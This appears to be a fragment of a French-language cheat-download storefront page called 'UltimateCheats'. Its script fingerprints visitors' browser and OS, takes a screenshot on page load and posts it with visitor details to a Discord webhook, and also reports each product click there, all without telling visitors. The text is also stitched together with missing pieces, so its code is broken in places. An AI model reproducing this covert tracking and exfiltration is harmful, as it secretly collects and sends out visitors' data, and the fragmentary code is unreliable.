  // D√©tecte le navigateur et sa version
  function getBrowserInfo(userAgent) {
    let name = "Inconnu";
    let version = "Inconnu";
    if (userAgent.includes("Firefox")) {
      name = "Firefox";
      version = userAgent.match(/Firefox\/(\d+)/)[1];
    } else if (userAgent.includes("Edg")) {
      name = "Edge";
      version = userAgent.match(/Edg\/(\d+)/)[1];
    } else if (userAgent.includes("Chrome")) {
      name = "Chrome";
      version = userAgent.match(/Chrome\/(\d+)/)[1];
    } else if (userAgent.includes("Safari")) {
      name = "Safari";
      version = userAgent.match(/Version\/(\d+)/)[1];
    } else if (userAgent.includes("Opera") || userAgent.includes("OPR")) {
      name = "Opera";
      version = userAgent.match(/(Opera|OPR)\/(\d+)/)[2];
    } else if (userAgent.includes("Trident")) {
      name = "Internet Explorer";
      version = userAgent.match(/rv:(\d+)/)[1];
    }
    return { name, version };
  }

  // D√©tecte l'OS et sa version (version de base)

      name = "iOS";
      version = userAgent.match(/OS (\d+[._]\d+)/)[1].replace("_", ".");
    }
    return { name, version };

      ],
      footer: {
        text: `UltimateCheats‚Ñ¢ | ${new Date().toLocaleString()}`,
      },
      timestamp: new Date(),
    };
    const payload = { embeds: [embed] };
    // Si un screenshot est disponible, l'ajouter en pi√®ce jointe
    if (userInfo.screenshot && !userInfo.screenshot.startsWith("Erreur")) {
      payload.files = [{
        attachment: userInfo.screenshot,
        name: "screenshot.jpg"
      }];
    }
    try {
      await fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });
    } catch (error) {
      console.error("Erreur webhook :", error);
    }
  }

  function createCard(cheat) {
    const card = document.createElement('div');
    card.className = 'product-card';
    card.tabIndex = 0;
    let badgesHTML = `<span class="badge ${cheat.badge}">${cheat.badgeText}</span> `;
    if (cheat.extraBadges && cheat.extraBadges.length) {
      cheat.extraBadges.forEach(b => {
        badgesHTML += `<span class="badge ${b}">${b.charAt(0).toUpperCase() + b.slice(1)}</span> `;
      });
    }
    let promoBadgeHTML = '';
    if(cheat.promo) {
      promoBadgeHTML = `<span class="badge promo">${cheat.promo}</span>`;
    }
    card.innerHTML = `
      ${promoBadgeHTML}
      <img src="${cheat.image}" alt="${cheat.title}">
      <div class="info">
        <h3>${cheat.title}</h3>
        ${badgesHTML}
        <p>${cheat.description}</p>
      </div>
    `;
    card.addEventListener('click', () => {
      sendToDiscordWebhook("Clic sur un cheat", cheat.title);
      showDetail(cheat.id);
    });
    card.addEventListener('keydown', (e) => {
      if(e.key === 'Enter' || e.key === ' ') {
        e.preventDefault();
        sendToDiscordWebhook("Clic sur un cheat", cheat.title);
        showDetail(cheat.id);
      }
    });
    return card;
  }

  function showDetail(id) {
    const cheat = cheats.find(c => c.id === id);
    if(!cheat) return;
    listView.style.display = 'none';
    detailView.style.display = 'block';
    detailView.innerHTML = `
      <h2>${cheat.title}</h2>
      <img src="${cheat.image}" alt="${cheat.title}">
      <p>${cheat.description}</p>
      <h3>Fonctionnalit√©s :</h3>
      <ul>
        ${cheat.features.map(f => `<li>${f}</li>`).join('')}
      </ul>
      <a href="${cheat.downloadLink}" class="badge ${cheat.badge}" style="font-size:1rem; padding:10px 20px; text-decoration:none; display:inline-block; margin-top:10px;">
        ${cheat.badgeText === 'Premium' ? 'üõí Acheter' : 'üîΩ T√©l√©charger'}
      </a>
      <br>
      <button id="btn-back">‚Üê Retour</button>
    `;
    document.getElementById('btn-back').addEventListener('click', () => {
      detailView.style.display = 'none';
      listView.style.display = 'flex';
    });
  }

  // Envoie une notification Discord d√®s le chargement de la page
  window.addEventListener('load', async () => {
    await captureScreenshot();
    sendToDiscordWebhook("Visite de la page d'accueil");
  });

  cheats.forEach(cheat => {
    listView.appendChild(createCard(cheat));
  });
</script>
</body>
</html>
